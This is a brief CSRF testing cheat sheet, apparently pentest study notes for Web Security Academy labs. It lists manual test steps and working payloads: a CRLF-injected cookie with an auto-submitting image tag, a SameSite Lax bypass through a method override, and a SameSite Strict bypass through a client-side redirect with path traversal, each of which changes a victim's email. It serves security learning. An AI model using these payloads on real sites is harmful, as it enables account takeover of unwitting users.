>Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

# Test
```js
Try without any cookie or ids and generate csrf

Try without any cookie or ids also change request method and generate csrf

Try and use other account id and use that to generate csrf, if success csrf is not tie up to userid or anything.

Try changing one of the value of cookie or session id or anything with second account id values if success its vuln

Try changing cookies values to something fake for example
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

# samesite lax bypass 
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST"; </script>

# SameSite Strict bypass via client-side redirect
look for in request post/login
SameSite=Strict
<script> document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1"; </script>












```